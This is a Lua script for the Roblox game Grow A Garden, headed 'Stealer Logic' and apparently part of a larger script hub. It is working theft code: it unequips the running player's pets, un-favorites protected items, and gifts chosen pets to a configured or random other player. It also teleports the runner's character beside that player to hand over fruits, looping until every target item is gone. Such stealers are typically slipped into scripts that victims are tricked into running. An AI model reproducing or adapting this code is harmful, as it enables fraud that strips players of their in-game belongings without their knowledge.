--[[ Stealer Logic ]]--
local GAG = Global.Games.GrowAGarden

if not GAG.Stealer.Enabled then
    return
end

local Flags = {
    Stealer = GAG.Stealer.Enabled,
    Processed = {
        Pets = {List = {}, LastCheck = 0, Attempts = 0},
        Fruits = {List = {}, LastCheck = 0, Attempts = 0},
        Finished = false
    }
}

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local petGiftingService = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local favoriteItemEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
local petsService = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")

local function GetRandomPlayer()
    local players = game:GetService("Players"):GetPlayers()
    local validPlayers = {}
    
    for _, plr in ipairs(players) do
        if plr ~= player then
            table.insert(validPlayers, plr)
        end
    end
    
    if #validPlayers > 0 then
        return validPlayers[math.random(1, #validPlayers)]
    end
    
    return nil
end

local targetItems = {
    Pets = GAG.Stealer.TargetItems.Pets,
    Fruits = GAG.Stealer.TargetItems.Fruits
}

local mode = "Pets"
local MAX_ATTEMPTS = 3
local inventory = player:WaitForChild("Backpack")

local function unequipAllPets()
    if not GAG.Stealer.AutoUnequipAllPets then return end
    
    local petsFolder = workspace:FindFirstChild("PetsPhysical")
    if not petsFolder then return end

    for _, pet in pairs(petsFolder:GetChildren()) do
        local petUUID = pet:GetAttribute("UUID")
        if petUUID then
            pcall(function()
                petsService:FireServer("UnequipPet", petUUID)
            end)
            task.wait(0.05)
        end
    end
end

local function processItem(item, itemType, targetPlayer)
    local baseName
    
    if itemType == "Pets" then
        baseName = item.Name:match("^(.-)%[") or item.Name
        baseName = baseName:match("^%s*(.-)%s*$")
    elseif itemType == "Fruits" then
        local nameWithoutMutations = item.Name:match("%b[]%s*(.-)%s*%[") or item.Name:match("^(.-)%[")
        baseName = (nameWithoutMutations or item.Name):match("^%s*(.-)%s*$")
    else
        return false
    end

    local targetList = targetItems[itemType]
    local processedList = Flags.Processed[itemType].List

    for _, target in ipairs(targetList) do
        if baseName == target and not table.find(processedList, item) then
            if not player.Character or not targetPlayer or not targetPlayer.Character then
                return false
            end

            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if not humanoid then return false end

            if itemType == "Pets" then
                if not item:IsA("Tool") then return false end
                
                pcall(function()
                    humanoid:EquipTool(item)
                end)
                task.wait(0.1)
                
                if item:GetAttribute("d") == true then
                    pcall(function()
                        favoriteItemEvent:FireServer(item)
                    end)
                    task.wait(0.1)
                end
                
                local success, err = pcall(function()
                    petGiftingService:FireServer("GivePet", targetPlayer)
                end)
                
                if success then
                    table.insert(processedList, item)
                    return true
                else
                    return false
                end
                
            elseif itemType == "Fruits" then
                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not targetRoot then return false end
                
                local originalPosition = player.Character.HumanoidRootPart.CFrame
                pcall(function()
                    player.Character.HumanoidRootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -3)
                end)
                task.wait(0.1)
                
                pcall(function()
                    humanoid:EquipTool(item)
                end)
                task.wait(0.1)
                
                local prompt = targetRoot:FindFirstChildOfClass("ProximityPrompt")
                if not prompt then
                    pcall(function()
                        player.Character.HumanoidRootPart.CFrame = originalPosition
                    end)
                    return false
                end
                
                pcall(function()
                    fireproximityprompt(prompt)
                end)
                task.wait(0.1)
                
                pcall(function()
                    player.Character.HumanoidRootPart.CFrame = originalPosition
                end)
                table.insert(processedList, item)
                return true
            end
        end
    end
    return false
end

local function processInventory()
    if not inventory or Flags.Processed.Finished then return end
    
    local targetPlayer
    if GAG.Stealer.RandomiseTargetPlayer then
        targetPlayer = GetRandomPlayer()
    else
        targetPlayer = game:GetService("Players"):FindFirstChild(GAG.Stealer.TargetPlayer)
    end
    
    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        Flags.Processed.Finished = true
        return
    end
    
    unequipAllPets()
    task.wait(0.05)

    local foundItems = false
    local currentMode = Flags.Processed[mode]
    
    for _, item in pairs(inventory:GetChildren()) do
        if item:IsA("Tool") then
            if processItem(item, mode, targetPlayer) then
                foundItems = true
                currentMode.Attempts = 0
            end
        end
    end

    if not foundItems then
        currentMode.Attempts = currentMode.Attempts + 1
        if currentMode.Attempts >= MAX_ATTEMPTS then
            currentMode.Attempts = 0
            mode = (mode == "Pets") and "Fruits" or "Pets"
            
            if mode == "Fruits" and #Flags.Processed.Pets.List == #targetItems.Pets and
               #Flags.Processed.Fruits.List == #targetItems.Fruits then
                Flags.Processed.Finished = true
                return
            end
        end
    end
end

player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid")
    pcall(processInventory)
end)

while task.wait(0.05) and GAG.Stealer.Enabled and not Flags.Processed.Finished do
    pcall(processInventory)
end
